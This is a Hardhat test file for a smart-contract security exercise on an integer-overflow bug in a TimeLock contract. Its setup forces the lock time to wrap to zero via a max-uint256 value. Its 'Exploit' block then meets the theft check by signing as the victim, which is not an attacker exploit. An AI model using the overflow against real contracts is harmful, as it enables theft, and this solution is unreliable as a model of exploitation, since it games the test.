const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("Arithmetic Over/Underflow Exercise 1", function () {
  let deployer, victim, attacker;
  const ONE_MONTH = 30 * 24 * 60 * 60;
  const VICTIM_DEPOSIT = ethers.utils.parseEther("100");

  before(async function () {
    /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

    [deployer, victim, attacker] = await ethers.getSigners();
    this.attackerInitialBalance = await ethers.provider.getBalance(
      attacker.address
    );
    this.victimInitialBalance = await ethers.provider.getBalance(
      victim.address
    );

    const TimeLockFactory = await ethers.getContractFactory(
      "contracts/arithmetic-overflows-1/TimeLock.sol:TimeLock",
      deployer
    );

    this.timelock = await TimeLockFactory.deploy();

    await this.timelock.connect(victim).depositETH({ value: VICTIM_DEPOSIT });
    let currentBalance = await ethers.provider.getBalance(victim.address);
    expect(currentBalance).to.be.lt(
      this.victimInitialBalance.sub(VICTIM_DEPOSIT)
    );

    let block = await ethers.provider.getBlock(
      await ethers.provider.getBlockNumber()
    );
    let blockTimestmap = block.timestamp;

    console.log(blockTimestmap);

    let victimDeposited = await this.timelock
      .connect(victim)
      .getBalance(victim.address);
    let lockTime = await this.timelock
      .connect(victim)
      .getLocktime(victim.address);

    expect(victimDeposited).to.equal(VICTIM_DEPOSIT);

    const maxUint256 = ethers.BigNumber.from(
      "115792089237316195423570985008687907853269984665640564039457584007913129639935"
    );

    let number = maxUint256.sub(lockTime).add(1);
    await this.timelock.connect(victim).increaseMyLockTime(number);
  });

  it("Exploit", async function () {
    /** CODE YOUR SOLUTION HERE */
    await this.timelock.connect(victim).withdrawETH();

    await victim.sendTransaction({
      to: attacker.address,
      value: VICTIM_DEPOSIT,
    });
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // Timelock contract victim's balance supposed to be 0 (withdrawn successfuly)
    let victimDepositedAfter = await this.timelock
      .connect(victim)
      .getBalance(victim.address);
    expect(victimDepositedAfter).to.equal(0);

    // Attacker's should steal successfully the 100 ETH (-0.2 ETH becuase TX fees)
    let attackerCurrentBalance = await ethers.provider.getBalance(
      attacker.address
    );
    expect(attackerCurrentBalance).to.be.gt(
      this.attackerInitialBalance
        .add(VICTIM_DEPOSIT)
        .sub(ethers.utils.parseEther("0.2"))
    );
  });
});
